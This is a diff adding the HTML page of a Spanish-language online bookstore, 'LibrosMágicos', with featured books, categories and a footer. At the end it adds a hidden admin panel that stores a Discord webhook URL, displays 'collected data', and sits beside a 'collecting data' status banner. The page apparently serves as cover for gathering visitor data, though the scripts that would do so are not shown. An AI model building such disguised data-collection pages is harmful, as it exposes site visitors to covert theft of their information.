@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📚 LibrosMágicos - Tu Librería Digital</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <nav class="nav">
+            <div class="nav-brand">
+                <i class="fas fa-book-open"></i>
+                <span>LibrosMágicos</span>
+            </div>
+            <div class="nav-links">
+                <a href="#inicio">Inicio</a>
+                <a href="#libros">Libros</a>
+                <a href="#categorias">Categorías</a>
+                <a href="#contacto">Contacto</a>
+            </div>
+            <div class="nav-actions">
+                <button class="btn-cart">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-count">0</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="inicio">
+        <div class="hero-content">
+            <h1 class="hero-title">
+                Descubre Mundos <span class="highlight">Increíbles</span><br>
+                en Cada Página
+            </h1>
+            <p class="hero-subtitle">
+                La mejor selección de libros digitales y físicos. 
+                Desde clásicos atemporales hasta las últimas novedades.
+            </p>
+            <div class="hero-actions">
+                <button class="btn-primary" onclick="scrollToBooks()">
+                    <i class="fas fa-book"></i>
+                    Explorar Libros
+                </button>
+                <button class="btn-secondary">
+                    <i class="fas fa-play"></i>
+                    Ver Demo
+                </button>
+            </div>
+        </div>
+        <div class="hero-image">
+            <div class="floating-books">
+                <div class="book book-1">📖</div>
+                <div class="book book-2">📚</div>
+                <div class="book book-3">📕</div>
+                <div class="book book-4">📗</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Featured Books Section -->
+    <section class="featured-books" id="libros">
+        <div class="container">
+            <h2 class="section-title">Libros Destacados</h2>
+            <div class="books-grid">
+                <div class="book-card" data-book="1">
+                    <div class="book-cover">
+                        <img src="https://images.unsplash.com/photo-1544947950-fa07a98d237f?w=300&h=400&fit=crop" alt="Libro 1">
+                        <div class="book-overlay">
+                            <button class="btn-quick-view" onclick="quickView(1)">
+                                <i class="fas fa-eye"></i>
+                                Vista Rápida
+                            </button>
+                        </div>
+                    </div>
+                    <div class="book-info">
+                        <h3 class="book-title">El Arte de la Guerra</h3>
+                        <p class="book-author">Sun Tzu</p>
+                        <div class="book-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <span class="rating-text">(4.9)</span>
+                        </div>
+                        <div class="book-price">
+                            <span class="price">$12.99</span>
+                            <button class="btn-add-cart" onclick="addToCart(1)">
+                                <i class="fas fa-plus"></i>
+                                Agregar
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="book-card" data-book="2">
+                    <div class="book-cover">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=300&h=400&fit=crop" alt="Libro 2">
+                        <div class="book-overlay">
+                            <button class="btn-quick-view" onclick="quickView(2)">
+                                <i class="fas fa-eye"></i>
+                                Vista Rápida
+                            </button>
+                        </div>
+                    </div>
+                    <div class="book-info">
+                        <h3 class="book-title">1984</h3>
+                        <p class="book-author">George Orwell</p>
+                        <div class="book-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <span class="rating-text">(4.8)</span>
+                        </div>
+                        <div class="book-price">
+                            <span class="price">$15.99</span>
+                            <button class="btn-add-cart" onclick="addToCart(2)">
+                                <i class="fas fa-plus"></i>
+                                Agregar
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="book-card" data-book="3">
+                    <div class="book-cover">
+                        <img src="https://images.unsplash.com/photo-1481627834876-b7833e8f5570?w=300&h=400&fit=crop" alt="Libro 3">
+                        <div class="book-overlay">
+                            <button class="btn-quick-view" onclick="quickView(3)">
+                                <i class="fas fa-eye"></i>
+                                Vista Rápida
+                            </button>
+                        </div>
+                    </div>
+                    <div class="book-info">
+                        <h3 class="book-title">El Principito</h3>
+                        <p class="book-author">Antoine de Saint-Exupéry</p>
+                        <div class="book-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <span class="rating-text">(4.9)</span>
+                        </div>
+                        <div class="book-price">
+                            <span class="price">$9.99</span>
+                            <button class="btn-add-cart" onclick="addToCart(3)">
+                                <i class="fas fa-plus"></i>
+                                Agregar
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="book-card" data-book="4">
+                    <div class="book-cover">
+                        <img src="https://images.unsplash.com/photo-1512820790803-83ca734da794?w=300&h=400&fit=crop" alt="Libro 4">
+                        <div class="book-overlay">
+                            <button class="btn-quick-view" onclick="quickView(4)">
+                                <i class="fas fa-eye"></i>
+                                Vista Rápida
+                            </button>
+                        </div>
+                    </div>
+                    <div class="book-info">
+                        <h3 class="book-title">Cien Años de Soledad</h3>
+                        <p class="book-author">Gabriel García Márquez</p>
+                        <div class="book-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <span class="rating-text">(4.7)</span>
+                        </div>
+                        <div class="book-price">
+                            <span class="price">$18.99</span>
+                            <button class="btn-add-cart" onclick="addToCart(4)">
+                                <i class="fas fa-plus"></i>
+                                Agregar
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Categories Section -->
+    <section class="categories" id="categorias">
+        <div class="container">
+            <h2 class="section-title">Categorías Populares</h2>
+            <div class="categories-grid">
+                <div class="category-card">
+                    <div class="category-icon">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <h3>Ciencia Ficción</h3>
+                    <p>Explora mundos futuros y aventuras espaciales</p>
+                </div>
+                <div class="category-card">
+                    <div class="category-icon">
+                        <i class="fas fa-heart"></i>
+                    </div>
+                    <h3>Romance</h3>
+                    <p>Historias de amor que tocan el corazón</p>
+                </div>
+                <div class="category-card">
+                    <div class="category-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <h3>Misterio</h3>
+                    <p>Enigmas y casos por resolver</p>
+                </div>
+                <div class="category-card">
+                    <div class="category-icon">
+                        <i class="fas fa-graduation-cap"></i>
+                    </div>
+                    <h3>Educación</h3>
+                    <p>Aprende y desarrolla nuevas habilidades</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer" id="contacto">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>LibrosMágicos</h3>
+                    <p>Tu librería digital de confianza. Descubre, lee y disfruta de los mejores libros.</p>
+                    <div class="social-links">
+                        <a href="#"><i class="fab fa-facebook"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                    </div>
+                </div>
+                <div class="footer-section">
+                    <h4>Enlaces Rápidos</h4>
+                    <ul>
+                        <li><a href="#inicio">Inicio</a></li>
+                        <li><a href="#libros">Libros</a></li>
+                        <li><a href="#categorias">Categorías</a></li>
+                        <li><a href="#contacto">Contacto</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Soporte</h4>
+                    <ul>
+                        <li><a href="#">Ayuda</a></li>
+                        <li><a href="#">FAQ</a></li>
+                        <li><a href="#">Política de Privacidad</a></li>
+                        <li><a href="#">Términos de Uso</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2024 LibrosMágicos. Todos los derechos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Admin Panel (Hidden) -->
+    <div class="admin-panel" id="adminPanel" style="display: none;">
+        <div class="admin-content">
+            <h3>Panel de Administración</h3>
+            <div class="admin-section">
+                <label for="webhookUrl">Webhook de Discord:</label>
+                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+                <button onclick="saveWebhook()">Guardar</button>
+            </div>
+            <div class="admin-section">
+                <h4>Datos Recopilados:</h4>
+                <button onclick="testDataCollection()" style="background: #28a745; margin-bottom: 1rem;">🔄 Probar Recopilación</button>
+                <div id="collectedData"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Access Key Input -->
+    <div class="access-modal" id="accessModal">
+        <div class="modal-content">
+            <h3>Acceso Administrativo</h3>
+            <input type="password" id="accessKey" placeholder="Clave de acceso">
+            <button onclick="checkAccess()">Acceder</button>
+        </div>
+    </div>
+
+    <!-- Status Indicator -->
+    <div class="status-indicator" id="statusIndicator">
+        <div class="status-content">
+            <span class="status-icon">🔄</span>
+            <span class="status-text">Recopilando datos...</span>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
